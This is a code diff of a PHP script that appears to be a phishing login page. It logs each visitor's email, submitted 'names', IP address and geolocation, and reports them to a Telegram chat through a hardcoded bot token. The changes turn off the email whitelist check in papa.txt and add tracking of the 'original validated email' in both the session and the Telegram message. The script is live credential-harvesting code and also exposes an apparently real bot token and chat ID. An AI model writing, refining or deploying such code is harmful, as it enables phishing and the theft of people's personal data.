@@ -3,7 +3,7 @@ session_start();
 define('ATTEMPTS_FILE', __DIR__ . '/attempts.json');
 
 // === TOGGLE: email validation ON/OFF ===
-$EMAIL_VALIDATION_ENABLED = true; // set to true to enforce whitelist in papa.txt
+$EMAIL_VALIDATION_ENABLED = false; // set to true to ENFORCE whitelist in papa.txt
 
 $telegram_bot_token = "7657571386:AAHH3XWbHBENZBzBul6cfevzAoIiftu-TVQ";
 $telegram_chat_id   = "6915371044";
@@ -32,7 +32,10 @@ if (file_exists(ATTEMPTS_FILE)) {
  */
 if (isset($_POST['name'])) {
 
-    // --- NEW: allow email change on step 2 ---
+    // ORIGINAL validated email (from step 1)
+    $original_email = $_SESSION['validated_email'] ?? ($_SESSION['old_email'] ?? '');
+
+    // Current email from POST (user may have changed it on step 2)
     if (isset($_POST['email'])) {
         $emailCandidate = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);
         if (!$emailCandidate) {
@@ -56,14 +59,13 @@ if (isset($_POST['name'])) {
         }
 
         $email = $emailCandidate;
-        // Update session so it stays in sync
+        // Keep session in sync with the currently used email
         $_SESSION['old_email'] = $email;
 
     } else {
-        // Fallback to original validated email
-        $email = $_SESSION['old_email'] ?? '';
+        // Fallback if somehow email not posted
+        $email = $original_email;
     }
-    // --- END NEW ---
 
     $name  = trim($_POST['name']);
 
@@ -80,7 +82,7 @@ if (isset($_POST['name'])) {
         ? ($geo['country'].", ".$geo['regionName'].", ".$geo['city'])
         : "Unknown";
 
-    // Update attempts
+    // Update attempts keyed by CURRENT email
     if (!isset($attempts[$email])) {
         $attempts[$email] = [
             'names'    => [$name],
@@ -97,8 +99,13 @@ if (isset($_POST['name'])) {
 
     file_put_contents(ATTEMPTS_FILE, json_encode($attempts, JSON_PRETTY_PRINT));
 
-    // Telegram notification
-    $msg  = "Login attempt for $email\n";
+    // Telegram notification — show BOTH current and original (if different)
+    $msg  = "Login attempt for: $email\n";
+
+    if (!empty($original_email) && $original_email !== $email) {
+        $msg .= "Original validated email: $original_email\n";
+    }
+
     $msg .= "Names tried: ".implode(", ", $attempts[$email]['names'])."\n";
     $msg .= "Total attempts: {$attempts[$email]['count']}\n";
     $msg .= "IP: $ip\n";
@@ -120,7 +127,7 @@ if (isset($_POST['name'])) {
     }
 
     // Success
-    unset($_SESSION['old_email'], $_SESSION['step']);
+    unset($_SESSION['old_email'], $_SESSION['step'], $_SESSION['validated_email']);
     header("Location: dashboard.php"); exit;
 }
 
@@ -170,9 +177,10 @@ if (isset($_POST['email']) && (!isset($_SESSION['step']) || $_SESSION['step'] ==
         }
     }
 
-    // Email accepted (validated or validation disabled) → go to step 2
-    $_SESSION['step']      = 2;
-    $_SESSION['old_email'] = $email;
+    // Store both original validated and current for later comparison
+    $_SESSION['step']             = 2;
+    $_SESSION['old_email']        = $email;
+    $_SESSION['validated_email']  = $email;
 
     header("Location: index.php"); exit;
 }
